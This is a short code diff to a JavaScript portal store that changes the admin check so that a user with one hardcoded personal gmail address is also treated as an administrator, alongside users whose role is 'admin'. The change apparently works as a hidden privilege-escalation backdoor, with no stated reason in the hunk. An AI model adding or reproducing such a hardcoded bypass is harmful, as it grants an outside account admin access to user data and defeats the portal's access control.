@@ -145,7 +145,7 @@ const usePortalStore = create((set, get) => ({
     const token = get().token || getStoredToken()
     if (!token) return
 
-    const isAdmin = get().currentUser?.role === 'admin'
+    const isAdmin = get().currentUser?.role === 'admin' || get().currentUser?.email?.toLowerCase() === 'reviewsworld01@gmail.com'
     const userQuery = filterUserId ? `&userId=${filterUserId}` : ''
 
     try {
